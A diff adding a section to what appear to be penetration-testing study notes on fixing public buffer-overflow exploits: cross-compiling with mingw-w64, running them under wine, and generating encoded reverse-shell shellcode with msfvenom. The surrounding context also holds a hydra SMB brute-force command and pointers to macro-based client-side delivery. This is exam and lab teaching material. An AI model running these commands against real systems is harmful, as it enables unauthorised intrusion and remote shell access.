@@ -104,6 +104,33 @@ hydra -L users.txt -P rockyou.txt smb://<target> -t 4
 searchsploit <software> <version>
 ```
 
+#### Step 1a: Fixing a Public Buffer Overflow Exploit
+> Full walkthrough (theory, cross-compiling, return-address verification, offset bugs, SEH mechanics): [[Fixing Exploits]]
+
+```bash
+# Exploit source includes winsock2.h/windows.h? Written to compile ON Windows, cross-compile from Kali instead
+sudo apt install mingw-w64
+i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32   # -lws2_32 fixes undefined-reference-to-WSAStartup errors
+
+# Run the compiled .exe directly from Kali, no Windows box needed
+wine exploit.exe
+
+# Fresh shellcode, avoid trusting an author's opaque hex blob
+msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread \
+  -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+```
+**Before trusting the return address**: check the target's loaded modules in a debugger, a hardcoded address from a DLL not present on the target is dead on arrival. Reuse an address from another **EDB-verified** exploit against the same vuln when available, that's more reliable than guessing.
+
+**Two debugging patterns worth recognizing:**
+- EIP holds a rotated/shifted version of the expected value → offset miscalculation, not a wrong return address (check `strcpy`/`strcat` null-terminator handling)
+- Target crashes/stops responding right after an exploit attempt with no listener running → likely the correct overwrite path, just an uncaught shell. Reset the VM, get the listener up **first**, retry
+
+Full syntax: [[Fixing Exploits#Cross-Compiling with mingw-w64|Command Appendix]], [[Buffer Overflow & Memory Corruption#msfvenom: Generating Shellcode for a BOF Payload|Command Appendix]]. Troubleshooting: [[Fixing Exploits (Decision Tree)|Decision Tree]], [[Buffer Overflow & Memory Corruption (Decision Tree)|Decision Tree]].
+
+#### Tags: #FixingExploits #BufferOverflow #MingwW64 #Wine #SEHOverflow
+
+---
+
 #### Step 1b: Client-Side Delivery (Macros / Library Files)
 
 For internal-only targets with nothing exposed to attack directly, get a user to run something instead. See [[Client-Side Attacks#12.2. Exploiting Microsoft Office|12.2]] (Office macros) and [[Client-Side Attacks#12.3. Abusing Windows Library Files|12.3]] (Windows library files + `.lnk`).
